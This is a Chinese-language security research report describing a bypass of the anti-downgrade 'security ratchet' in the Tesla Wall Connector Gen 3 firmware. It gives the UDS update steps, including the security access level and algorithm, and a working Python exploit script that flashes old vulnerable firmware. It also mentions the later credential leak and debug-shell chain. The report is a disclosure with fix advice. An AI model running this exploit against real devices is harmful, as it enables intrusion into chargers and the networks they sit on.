## 摘要

本报告总结了 Synacktiv 安全研究团队针对特斯拉壁挂式充电器（Tesla Wall Connector Gen 3）的安全研究成果。在 Pwn2Own Automotive 2025 比赛中，安全研究人员展示了针对该设备的完整攻击链。特斯拉随后在固件版本 24.44.3 中引入了"安全棘轮"（Security Ratchet）机制以防止降级攻击。本报告详细分析了该防护机制的工作原理，并披露了研究人员如何通过滥用分区表写入与扇区擦除的操作顺序，成功绕过该防护机制，在最新固件设备上实现降级攻击。

---

## 研究背景

### 第一部分研究回顾

在[上一篇文章](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector)中，研究人员展示了针对 Tesla Wall Connector Gen 3 的完整攻击链，该攻击链在 Pwn2Own Automotive 2025 比赛中成功利用。该攻击利用了一个关键漏洞：设备缺少防降级（anti-downgrade）机制。一旦攻击者能够通过充电线缆使用 UDS 协议进行通信，就可以向被动槽（passive slot）写入存在漏洞的旧固件，重启后即可获得调试 shell。

### Tesla 的防护措施

在上述攻击公开后，特斯拉发布了固件更新 24.44.3，引入了防降级检查机制。该机制的核心设计如下：

- 每个固件镜像携带一个**安全棘轮值**（security ratchet value）
- 更新程序（updater）拒绝任何棘轮值低于设备当前存储值的固件镜像
- 棘轮值存储在 PSM（持久性存储管理器）中，当激活更高棘轮值的镜像时会递增

---

## 安全棘轮机制分析

### 更新流程概述

通过单线 CAN（Single-Wire CAN）接口的完整更新流程如下：

1. 打开 UDS 会话（类型 2）
2. 使用安全访问进行身份验证（级别 5，XOR-0x35 算法）
3. 运行例程 0xFF00 准备并擦除被动槽
4. 向标识符 0x102 写入 0x0E，标记该槽可通过 UDS 设置
5. 使用 Request Download / Transfer Data / Request Transfer Exit 推送固件
6. 运行例程 0x201 验证刚写入的镜像并切换槽
7. 运行例程 0x202 重启设备

### 24.44.3 版本中的变化

在固件 24.44.3 中，研究人员分析了 `switch_to_new_firmware()` 函数，该函数处理 UDS 例程 0x201。关键代码逻辑如下：

```c
int switch_to_new_firmware()
{
    if ( settable_via_uds != 14 || !passive_firmware )
        return 1;
    if ( passive <= 0
      || passive > passive_firmware->size
      || (v2 = check_signature(passive_firmware->start, passive)) != 0
      || !check_image_and_antidowngrade(nullptr) )
    {
        part_erase(flash_drv, passive_firmware->start, 0x14u);
        v2 = 4;
    }
    else
    {
        part_write_layout(passive_firmware);
    }
    ...
}
```

新增的 `check_image_and_antidowngrade()` 函数执行以下操作：

- 解析固件段
- 重新计算 CRC
- 调用 `verify_firmware_segments_platform()` 进行棘轮比较

### 棘轮验证机制

版本信息嵌入在固件段的特定标记中：

- **VRSN**：版本描述符
- **VRS2**：棘轮值

版本信息位于加载地址约 0x100000 的段中，仅更新程序会解析该信息，引导加载器不会检查。

关键验证逻辑：
- 从 PSM 读取当前棘轮值
- 比较固件棘轮值与当前棘轮值
- 如果固件棘轮值低于当前值，拒绝更新并立即擦除槽

在 24.44.3 设备上，尝试发送旧固件（0.8.58）并调用例程 0x201 会导致：

```
ERROR verify_firmware_segments_platform:145
Failure: Security ratchet downgrade prevented 0 < N
```

槽会立即被擦除，无法通过官方路径保留旧镜像。

## 绕过方法分析

### 引导加载器的盲点

研究人员在分析中发现：

- **boot2**（引导加载器）位于闪存中的固定地址，**不属于特斯拉发布的固件更新**
- 引导加载器执行以下检查：
  - 魔术头（Magic header, SBFH）
  - 每段 CRC32
  - RSA 签名验证
- **引导加载器不检查安全棘轮**
- 任何具有有效签名和正确 CRC 的固件镜像都会执行，无论其版本
- 引导加载器和启动 ROM 均未实施安全启动

因此，防降级仅由一个代码片段（`switch_to_new_firmware()`）在一个时刻（例程 0x201 被调用时）强制执行。

### 槽激活机制

关键发现：

1. **g_boot_flags 在启动时设置，会话期间永不更新**
   - 反映启动时的槽，而非分区表当前状态

2. **part_write_layout() 不修改固件数据**
   - 仅重写分区表，增加每个槽的 generation counter
   - 引导加载器选择具有最高 generation level 的槽

3. **例程 0xFF00 调用 prepare_passive_slot()**
   - 根据 g_boot_flags 选择物理被动槽
   - 擦除该槽

## 攻击利用详解

### 绕过原理

利用逻辑基于以下观察：

- 例程 0xFF00 根据 g_boot_flags（会话期间不变）擦除物理被动槽
- 例程 0x201 验证槽内容并写入分区布局
- 引导加载器信任分区表，不检查棘轮

### 攻击步骤

1. **发送有效的最新固件到被动槽**
   - 调用例程 0x201
   - 验证通过，分区布局写入，该槽获得最高 generation level

2. **不重启，再次调用例程 0xFF00**
   - g_boot_flags 未改变
   - 同一物理槽被选为被动槽
   - 刚验证的固件被擦除
   - 分区表未被修改

3. **向空槽发送旧的、有漏洞的固件**

4. **跳过例程 0x201**
   - 不需要调用（且会被拒绝）
   - 直接调用例程 0x202 重启

5. **重启后**
   - 引导加载器读取分区表
   - 选择具有最高 generation level 的槽
   - 验证签名（仍然有效，因为是正确签名的固件）
   - 跳转执行
   - 防降级检查从未在旧镜像上运行

### 漏洞利用代码

```python
with Client(conn, config=uds_config) as client:
    client.set_config('security_algo', tesla_uds_algo)
    client.change_session(2)
    client.unlock_security_access(5)

    # 1. 推送有效最新固件，让例程 0x201 为我们写入分区布局
    client.routine_control(routine_id=0xFF00, control_type=1)
    client.write_data_by_identifier(0x102, 0x0E)
    data = open("firmwares/WC3_RELEASE_FLEET_24.44.3.prodsigned.bin","rb").read()
    send_firmware_data(client, data)
    client.routine_control(routine_id=0x201, control_type=1)
    sleep(1)

    # 2. 重新准备同一物理槽，有效固件被擦除，分区表未触动
    client.routine_control(routine_id=0xFF00, control_type=1)
    client.write_data_by_identifier(0x102, 0x0E)
    data = open("firmwares/WC3_PROD_OTA_08.58.bin","rb").read()
    send_firmware_data(client, data)
    sleep(1)

    # 3. 重启，引导加载器将启动旧固件
    client.routine_control(routine_id=0x202, control_type=1)
```

### 攻击耗时

总运行时间约 30 分钟（基于 33.3 kbps SWCAN 总线），是原始 Pwn2Own 时长的两倍，因为需要发送两个完整固件镜像。

重启后，版本 0.8.58 恢复运行，原始攻击链的其余部分（UDS 泄露 Wi-Fi 凭据、telnet 调试 shell、参数解析器缓冲区溢出）与之前完全相同。

## 防护建议

研究人员提出的修复建议：

1. **在引导加载器中强制执行棘轮检查**
   - 关闭此漏洞的根本解决方案

2. **例程 0xFF00 在擦除槽时使分区布局条目失效**
   - 使被擦除后重写的槽永远不会被选为可启动

3. **成功更新后强制重启**

4. **例程 0x201 成功后拒绝任何新的更新会话**

---

## 漏洞修复状态

研究人员已向特斯拉报告此漏洞，该漏洞已在固件更新中修复。与第一篇文章一样，壁挂式充电器通常位于家庭或企业网络中，通过充电线缆攻陷的充电器可成为该网络的切入点。积极的方面是，特斯拉的自动 OTA 部署意味着修复能够快速覆盖大多数设备，实际减少了暴露窗口。
